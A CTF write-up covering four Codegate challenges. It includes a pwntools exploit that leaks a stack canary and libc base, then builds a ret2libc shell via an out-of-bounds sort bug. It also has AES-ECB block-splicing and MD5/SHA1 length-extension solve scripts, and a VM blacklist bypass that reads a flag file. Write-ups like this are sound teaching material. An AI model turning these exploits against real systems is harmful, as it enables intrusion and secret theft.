# Zeynarz (#25) junior category writeup
## Libarian (pwn)

checksec:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

The vulnerability is in the sort() function
```C
void sort(long param_1){
  long lVar1;
  int ret;
  undefined8 *book;
  long lVar20;
  long in_FS_OFFSET;
  int i;
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);

  i = n - 2;
  while (-1 < i) {
    ret = strcmp((param_1 + (i + 1) * 0x80),(param_1 + i * 0x80));
    // if ret > 0, the 1st param (the further one) is greater
    // if ret < 0, the 2nd param (the closer one) is greater


    if ((ret < 0) && (i != n)) { // the closer one > the further one
      book = (param_1 + i * 0x80);
      // get the title, one var is 8 bytes
      uVar2 = book[0];
      uVar3 = book[1];
      uVar4 = book[2];
      uVar5 = book[3];
      uVar6 = book[4];
      uVar7 = book[5];
      uVar8 = book[7];
      uVar9 = book[6];

      lVar20 = param_1 + i * 0x80;
      // get the comment
      uVar10 = *(lVar20 + 0x40);
      uVar11 = *(lVar20 + 0x48);
      uVar12 = *(lVar20 + 0x50);
      uVar13 = *(lVar20 + 0x58);
      uVar14 = *(lVar20 + 0x60);
      uVar15 = *(lVar20 + 0x68);
      uVar16 = *(lVar20 + 0x78);
      uVar17 = *(lVar20 + 0x70);

      // copy stuff from the further one to the closer one
      memcpy((param_1 + i * 0x80),(param_1 + (i + 1) * 0x80),0x40);
      memcpy((param_1 + i * 0x80 + 0x40),(param_1 + (i + 1) * 0x80 + 0x40),0x40);

      // copy stuff from closer one to further one
      book = (param_1 + (i + 1) * 0x80);
      book[0] = uVar2;
      book[1] = uVar3;
      book[2] = uVar4;
      book[3] = uVar5;
      book[4] = uVar6;
      book[5] = uVar7;
      book[6] = uVar9;
      book[7] = uVar8;
      lVar20 = param_1 + ((long)i + 1) * 0x80;
      *(lVar20 + 0x40) = uVar10;
      *(lVar20 + 0x48) = uVar11;
      *(lVar20 + 0x50) = uVar12;
      *(lVar20 + 0x58) = uVar13;
      *(lVar20 + 0x60) = uVar14;
      *(lVar20 + 0x68) = uVar15;
      *(lVar20 + 0x70) = uVar17;
      *(lVar20 + 0x78) = uVar16;
      i = i + 1;
    }
    else {
      i = i - 1;
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

The problem with how the sort function is implemented, is that when the second last element swaps with the last element, i != n, thus the sort function keeps going and compares the i'th element and the i+1'th element, which means that it will go out of bounds

Visual representation:  
```
(let's say that the library can only hold 3 books)

iteration 1:
state:
              i                     n
-------    -------    -------    -------
|val=1| -> |val=3| -> |val=2| -> | oob |
-------    -------    -------    -------

result:
i'th element switches with i+1'th element, i++



iteration 2:
state:

                         i          n
-------    -------    -------    -------
|val=1| -> |val=2| -> |val=3| -> | oob |
-------    -------    -------    -------

result: if i'th element > n'th element, switch

thus causing:
-------    -------    -------    -------
|val=1| -> |val=2| -> | oob | -> |val=3|
-------    -------    -------    -------

```  

In this case, the oob memory area is justs where the canary,rbp and ret lies.  
Thus, this allows us to use sort() to not only  
1. Leak libc and canary
2. Overwrite ret with own memory


What I did was:
1. Fill up the library with books and display books to leak addresses
2. Clear the books
3. Fill up the library again, but this time, I make the second last book be larger than the last book, and setup the ret2libc and canary in the second last book

exploit.py:
```python
from pwn import *
#io = process("./librarian")
io = remote("43.201.16.196",8888)
libc = ELF("./libc.so.6")

def displayBooks():
    io.sendlineafter("choice:","1")
    return io.recvuntil("Menu")

def addBook(title):
    io.sendlineafter("choice:","2")
    io.sendlineafter("Book title:",title)

def addComment(comment):
    io.sendlineafter("choice:","3")
    pass

def clearBooks():
    io.sendlineafter("choice:","4")

def leave():
    io.sendlineafter("choice:","5")


addBook("A"*0x3f)
addBook("B"*0x3f)
addBook("C"*0x3f)
addBook("D"*0x3f)
addBook("E"*0x3f)

leak = displayBooks()
startIndex = leak.index(b"5. ") + 11
canary = u64(leak[startIndex:startIndex+8])
libc.address = u64(leak[startIndex+16:startIndex+22].ljust(8,b"\x00")) - 144656

log.info("CANARY: " + hex(canary))
log.info("LIBC BASE: " + hex(libc.address))

clearBooks()
for i in range(13):
    addBook("A"*0x3f)

popRdi = p64(libc.address + 0x23b65)
ret = p64(libc.address + 0x233d1)

ret2libc  = b"\xff" * 8 + p64(canary) + b"A"*8
ret2libc += ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
addBook(ret2libc)

addBook("A"*0x3f)

#gdb.attach(io,gdbscript="break *0x555555555b01")
leave()
io.interactive()
```

### Extra:
At first, I thought that the add comment function was the one with the vulnerability
```C
void addComment(long param_1){
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  uint index;
  char comment [72];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);

  printf("Index: ");
  __isoc99_scanf("%d",index); // where is the &? is it supposed to be uninitialised var vuln?
  if (index < n) { // "%d", so neg num vuln exists
    // I think you have to use uninitialised vuln to write index, and use - to bypass scanf
    iVar1 = read(0,comment,0x3f);
    if (comment[iVar1 + -1] == '\n') {
      comment[iVar1 + -1] = '\0';
    }
    memcpy(param_1 + index * 0x80 + 0x40,comment,iVar1);
    // overwrite ret of memcpy?
  }
  else {
    puts("Index must be less than the number of books.");
  }

  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```
I was thinking of writing negative indexes to get oob write, but the problem with this function is
``` C
__isoc99_scanf("%d",index); // NOT __isoc99_scanf("%d",&index);
```

I thought that this was a mistake by the author, and even made a ticket to ask the organizers.  
They said that everything was working as intended, so it turns out that this function was just useless.



## Cryptgenius (Crypto)
This challange used AES ECB mode to allow us to encrypt up to 20 bytes. (the key was hidden)  
The challenge also had a decrypt function, and to get the flag, you had to put in a string that decoded into "6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7"

As you only could encrypt 20 bytes a time, you couldn't just throw this into the encrypt function



The problem is, AES ECB is a block cipher. It seperates the string it wants to encode into 16 byte chunks, and encodes them seperately.  
Meaning that AES("A"*16 + "B"*16) == AES("A"*16) + AES("B"*16)  

So we just had to divide the 128 long string into 8 groups of 16 bytes and encrypt them seperately.


### Oh no! A problem occurs
I'm not sure why, but when I used the program to
1. encrypt "AAAABBBBCCCCDDDD"
2. encrypt "0000111122223333"
3. decode their base64 strings
4. concatenate the two byte strings together
5. encode it with b64
6. put the b64 string back into the program

```
// I set the key to b"A"*16
vagrant@ubuntu-focal:~/ctf/codegate23/cryptgenius$ python3 cryptGenius.py

========= Your Behavior =========
1. EXPERIMENT
2. SUBMIT
3. CLOSE

your behavior > 1
I'm a crypto genius
Do you want to experiment? > AAAABBBBCCCCDDDD
b'8m85rQ3LhAN8d3gg0neOzAUVvh2a+0xUogOQlz9YKNg='

========= Your Behavior =========
1. EXPERIMENT
2. SUBMIT
3. CLOSE

your behavior > 1
I'm a crypto genius
Do you want to experiment? > 0000111122223333
b'FuoO0OphyWcH/ybzU8qGIgUVvh2a+0xUogOQlz9YKNg='

vagrant@ubuntu-focal:~/ctf/codegate23/cryptgenius$ python3
Python 3.8.10 (default, Mar 13 2023, 10:26:41)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> a = base64.b64decode(b'8m85rQ3LhAN8d3gg0neOzAUVvh2a+0xUogOQlz9YKNg=') + base64.b64decode(b'FuoO0OphyWcH/ybzU8qGIgUVvh2a+0xUogOQlz9YKNg=')
>>> print(base64.b64encode(a))
b'8m85rQ3LhAN8d3gg0neOzAUVvh2a+0xUogOQlz9YKNgW6g7Q6mHJZwf/JvNTyoYiBRW+HZr7TFSiA5CXP1go2A=='


// I added print statements in the cryptgenius.py file
vagrant@ubuntu-focal:~/ctf/codegate23/cryptgenius$ python3 cryptGenius.py | hexdump -C
00000000  0a 3d 3d 3d 3d 3d 3d 3d  3d 3d 20 59 6f 75 72 20  |.========= Your |
00000010  42 65 68 61 76 69 6f 72  20 3d 3d 3d 3d 3d 3d 3d  |Behavior =======|
00000020  3d 3d 0a 31 2e 20 45 58  50 45 52 49 4d 45 4e 54  |==.1. EXPERIMENT|
00000030  0a 32 2e 20 53 55 42 4d  49 54 0a 33 2e 20 43 4c  |.2. SUBMIT.3. CL|
00000040  4f 53 45 0a 0a 79 6f 75  72 20 62 65 68 61 76 69  |OSE..your behavi|
2
00000050  6f 72 20 3e 20 44 69 64  20 79 6f 75 20 61 6c 72  |or > Did you alr|
00000060  65 61 64 79 20 73 6f 6c  76 65 20 74 68 65 20 74  |eady solve the t|
8m85rQ3LhAN8d3gg0neOzAUVvh2a+0xUogOQlz9YKNgW6g7Q6mHJZwf/JvNTyoYiBRW+HZr7TFSiA5CXP1go2A==
00000070  72 69 63 6b 3f 20 3e 20  41 41 41 41 42 42 42 42  |rick? > AAAABBBB|
00000080  43 43 43 43 44 44 44 44  10 10 10 10 10 10 10 10  |CCCCDDDD........|
00000090  10 10 10 10 10 10 10 10  30 30 30 30 31 31 31 31  |........00001111|
000000a0  32 32 32 32 33 33 33 33  0a 34 38 0a 79 6f 75 27  |22223333.48.you'|
000000b0  72 65 20 73 74 69 6c 6c  20 66 61 72 20 61 77 61  |re still far awa|
000000c0  79 0a 0a 3d 3d 3d 3d 3d  3d 3d 3d 3d 20 59 6f 75  |y..========= You|
000000d0  72 20 42 65 68 61 76 69  6f 72 20 3d 3d 3d 3d 3d  |r Behavior =====|
000000e0  3d 3d 3d 3d 0a 31 2e 20  45 58 50 45 52 49 4d 45  |====.1. EXPERIME|
000000f0  4e 54 0a 32 2e 20 53 55  42 4d 49 54 0a 33 2e 20  |NT.2. SUBMIT.3. |
00000100  43 4c 4f 53 45 0a 0a 79  6f 75 72 20 62 65 68 61  |CLOSE..your beha|
```

There are all these \x10 bytes between the two 16 byte strings  
I then directly encoded "AAAABBBBCCCCDDDD1111222233334444" by increasing the bytes allowed in cryptgenius.py file, and got "8m85rQ3LhAN8d3gg0neOzAiaEdsYZcOOYAda+36D8j8FFb4dmvtMVKIDkJc/WCjY"  


I then printed out both
```
>> a = base64.b64decode(b'8m85rQ3LhAN8d3gg0neOzAUVvh2a+0xUogOQlz9YKNg=') + base64.b64decode(b'FuoO0OphyWcH/ybzU8qGIgUVvh2a+0xUogOQlz9YKNg=')
>> print(a)
b'\xf2o9\xad\r\xcb\x84\x03|wx \xd2w\x8e\xcc\x05\x15\xbe\x1d\x9a\xfbLT\xa2\x03\x90\x97?X(\xd8\x16\xea\x0e\xd0\xeaa\xc9g\x07\xff&\xf3S\xca\x86"\x05\x15\xbe\x1d\x9a\xfbLT\xa2\x03\x90\x97?X(\xd8'
>> print(base64.b64decode("8m85rQ3LhAN8d3gg0neOzAiaEdsYZcOOYAda+36D8j8FFb4dmvtMVKIDkJc/WCjY")
b'\xf2o9\xad\r\xcb\x84\x03|wx \xd2w\x8e\xcc\x08\x9a\x11\xdb\x18e\xc3\x8e`\x07Z\xfb~\x83\xf2?\x05\x15\xbe\x1d\x9a\xfbLT\xa2\x03\x90\x97?X(\xd8'
```

and found out that the two byte strings were identical, except for the random 16 bytes in the middle  
Thus for every decoded byte string, I had to do
```python
finalStr = finalStr[:-16]
```

(except for the last byte string for some reason)

solve.py:
```python
from pwn import *
import base64
io = remote("13.124.113.252",12345)
#io = process(["python3","cryptGenius.py"])

target = b"6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7"

finalStr = b""

n = 8
for i in range(n):
    io.sendlineafter("your behavior >","1")
    io.sendlineafter("Do you want to experiment? >",target[i*16:i*16+16]) # an AES ECB block is 16 bytes
    io.recvuntil("b'")
    b64Str = io.recvuntil("'")[:-1].decode()
    finalStr += base64.b64decode(b64Str)
    if i != n-1:
        finalStr = finalStr[:-16]

finalStr = base64.b64encode(finalStr)
io.sendlineafter("your behavior >","2")
io.sendlineafter("Did you already solve the trick? >",finalStr)


# used this to figure out the finalStr += ... [:-16]
"""
target = "AAAABBBBCCCCDDDD1111222233334444"
print(finalStr)
print(base64.b64decode("8m85rQ3LhAN8d3gg0neOzAiaEdsYZcOOYAda+36D8j8FFb4dmvtMVKIDkJc/WCjY"))
"""

io.interactive()
```

## Login (Crypto)
This challange generated two 8 char random strings for userId and userPw, and generated two 20 char random strings for idKey and pwKey
```python
USER_ID = generate_random_string(8)
USER_PW = generate_random_string(8)
id_key = generate_random_string(20)
pw_key = generate_random_string(20)
```

At the start of the program, it tells you the
1. USER_ID
2. USER_PW
3. md5(id_key)
4. sha1(pw_key)

When you chose to login,the program requires you to send hexstrings that CONTAINS the USER_ID and USER_PW  
Note that it doesn't check if the hexstrings are EQUAL to the USER_ID and USER_PW, as long as the USER_ID and USER_PW are in the hexstrings, the boolean will be True.  

Then, it asks for the result of
```python
sha1(pw_key + user_pw + md5(id_key + user_id).hexdigest().encode("utf-8"))
```

If you give the correct hash, you get the flag


What we can do here is called a length-extension attack.  
You can read more about it here:  
https://www.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
https://en.wikipedia.org/wiki/Length_extension_attack  
https://justcryptography.com/length-extension-attack/#:~:text=The%20length%20extension%20attack%20exploits,the%20end%20of%20the%20execution.

TL;DR, the hashes generated by md5 and sha1 actually represent the state of the hashing algorithm, thus if you know HASH(secret) and the lenght of secret, you can compute HASH(secret+ownStr)

(more precisely, HASH(secret+padding+ownStr))


I used a tool called hash_extender which can be found at https://github.com/iagox86/hash_extender to help me calculate the signatures.


### Own problem
The problem that I had during the ctf was that I thought the tool could find the signature of HASH(secret+ownStr), or in this case, md5(id_key+USER_ID)  
So I couldn't figure out why the hash given by hash_extender
```
./hash_extender -s md5(id_key) -a USER_ID -f md5 -l 20 --data=
```
was different from
```python
# I added this line in the chall.py file to help with debugging
print("md5(id_key+USER_ID)",md5(id_key+USER_ID).hexdigest())
```

That was until I reread the articles, and found out that hash_extender produces MD5(id_key + padding + USER_ID), NOT MD5(id_key + USER_ID)  

The padding is to make it a 0x40 byte chunk and how it works is it adds a "\x80" byte to the end of secret, and a bunch of "\x00" until there's 8 bytes left, and then it adds the length of secret   
(for md5, the length of secret is represented in little endian, whereas for sha1, the length of secret is in big endian)  

Thus what I did was writing the hexstring of padding + USER_ID when logging in, so that
```
user_id = padding + USER_ID
```
and when md5(id_key + user_id) is calculated, the md5 of id_key + padding + USER_ID was calculated, and I could tell hash_extender to calculate the signature with arguments
```
./hash_extender -s md5(id_key) -a USER_ID -f md5 -l 20 --data=
```
since hash_extender will calculate MD5( id_key + padding + USER_ID)

### Solution
Use length extension to figure out md5(id_key + user_id), then use length extension again to figure out
```python
sha1(pw_key + user_pw + md5(id_key + user_id).hexdigest().encode("utf-8"))
```


solve.py:
```python
# https://www.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
# https://en.wikipedia.org/wiki/Length_extension_attack
# https://justcryptography.com/length-extension-attack/#:~:text=The%20length%20extension%20attack%20explo
its,the%20end%20of%20the%20execution.          

from pwn import *
#io = process(["python3","chall.py"])
io = remote("13.124.163.225",8282)  

# the length field of md5 hash uses little-endian, whereas sha1 uses big-endian
md5Padding  = b"\x80".ljust(0x40-20-8,b"\x00")                                                           
md5Padding += p64(20*8)                             

sha1Padding  = b"\x80".ljust(0x40-20-8,b"\x00")
sha1Padding += b"\x00" * 7 + b"\xa0"

md5Padding  = bytes.hex(md5Padding)
sha1Padding = bytes.hex(sha1Padding)

def hashExtender(ogSignature,append,hashFormat):
    # this finds the hash of password+padding+ownMessage
    # NOT the hash of password+ownMessage
    a = process(["./hash_extender","-s",ogSignature,"-a",append,"-f",hashFormat,"-l","20",'--data='])
    a.recvline()                                    
    a.recvline()   
    return a.recvline()[15:-1]

io.sendlineafter("**","1")

# get creds                                         
io.recvuntil("USER_ID = ")
userId = io.recv(8)

io.recvuntil("USER_PW = ")
userPw = io.recv(8)

io.recvuntil("md5(id_key) = ")    
idKeyMd5 = io.recv(32)

io.recvuntil("sha1(pw_key) = ")              
pwKeySha1 = io.recv(40)                                                                                  

# login              
io.sendline("2")

creds = md5Padding + bytes.hex(userId) + ":" + sha1Padding + bytes.hex(userPw)
io.sendlineafter("70617373",creds)

# calculate and send hash
md5Hash = hashExtender(idKeyMd5,userId,"md5")
sha1Hash = hashExtender(pwKeySha1,userPw + md5Hash,"sha1")

io.sendline(sha1Hash)
io.interactive()
```

## vspace (rev)
This challange is just a stack machine virtual machine   
It essentially takes base64 encoded json data, and execute them as instructions

For example
```json
[{"opcode": "😀", "operands": [["yo"]]}]
```
this pushes "yo" onto the stack   


When I first tried to run main.py, I got the error
```
Traceback (most recent call last):
  File "main.py", line 1, in <module>
    from EngineStruct import Instruction
ModuleNotFoundError: No module named 'EngineStruct'
```

EngineStruct is probably a py file that they didn't give us, but the functions it provided were pretty simple.  

In Engine.py:
```python
from EngineStruct import Stack, Instruction
```

So I just had to implement a Stack function and a Instruction object

For the Stack function, I changed it to a simple python list as it acts as a stack, and just changed every self.stack.push() instruction to self.stack.append() as the list object only has the append function which acts the same as push

before:
```python
class VMEngine:                                     
    def __init__(self):                                                                                  
        self.pc = 0                                                                                      
        self.stack = Stack()                        
        self.values = {}

...

match insn.opcode:                                                                           
    case "😀":                                                                               
        self.stack.push(insn.opnd[0])  
```

after:
```python
class VMEngine:                                                                                          
    def __init__(self):                             
        self.pc = 0                                                                                      
        self.stack = []                                                                                  
        self.values = {}

...

match insn.opcode:                                                                           
    case "😀":                                                                               
        self.stack.append(insn.opnd[0])
```

For the Instruction object, it seems like it had opcode and opnd as its properties.   
self.opcode being a string and self.opnd being a list  

So I just added
```
class Instruction:                                                                                       
    def __init__(self,opcode,opnd):                                                                      
        self.opcode = opcode                                                                             
        self.opnd = opnd                                                                                 
```

to Engine.py and removed the EngineStruct import from both files.  
It works!  

### Solution
After main.py creates a VMEngine object, it sets it's black_list and file_options properties
```python
vme = VMEngine()
vme.set_black_list(["flag"])
vme.set_file_options(["exists"])
```
These two properties are refered to when a very special "🧠" instruction is called
```python
case "🧠":
    filename = self.stack.pop()
    index = self.stack.pop()
    if type(filename) != str:
        print("Operand type error!")
        break

    _path = pathlib.Path(filename)

    if _path.name in self.get_black_list():
        print("Blacklist error!")
        break

    options = self.get_file_options()                        
    print(options)
    try:
        result = _path.__getattribute__(options[index])(*insn.opnd)
        if types.GeneratorType == type(result):
            self.stack.append(list(result))
        else:
            self.stack.append(result)
    except IndexError:
        print("Out of range!")
        break
```

Filenames in the blacklist cannot be accessed and only function names stored in values["file_options"] can be used  
The index variable is used to determine what functions are called, for example
```python
# lets say that insn.opnd = [], and
self.values["file_options"] = ["exists"]
index = 0

...

# this will evaluate to,
# result = __path.exists()
result = _path.__getattribute__(options[index])(*insn.opnd)
```

Other useful instructions:
```python
# can be used as a push instruction
case "😀":                                                                               
    self.stack.append(insn.opnd[0])

# can be used to set values["blacklist"] and values["file_options"]
case "😂":
    operand1 = insn.opnd[0]
    value = self.stack.pop()

    if type(operand1) != str:
        print("Operand type error!")
        break

    self.values[operand1] = value

# can be used to print values on the stack
case "✓":
    print(self.stack.pop())
```


So the plan is simple, use instruction "😀" to setup the stack, then use instruction "😂" to setup the blacklist and file_options, and execute "read_text" on the flag file to get the flag on the stack. Then finally, use the "✓" instruction to print the flag.  


But how can we know where is the flag?  
We can use the "glob" function on a file path to essentially do a "ls"  

With this, we can find that the flag file path is actually "/home/ctf/codegate2023-read-plz"
We can then just read it using the method said above

solve.py:
```python
import json
import base64

instrs = []

def makeInstr(opcode,operands):
    instrs.append({"opcode": opcode,"operands": operands})

# setup blacklist and file_options
makeInstr("😀",[[]])
makeInstr("😂",["blacklist"])
makeInstr("😀",[["glob","read_text"]])
makeInstr("😂",["file_options"])

# use glob to list directory contents, then read flag
makeInstr("😀",[1])
makeInstr("😀",["/home/ctf/codegate2023-read-plz"])

makeInstr("🧠",[])

makeInstr("✓",[])

print(base64.b64encode(json.dumps(instrs).encode()).decode())
```
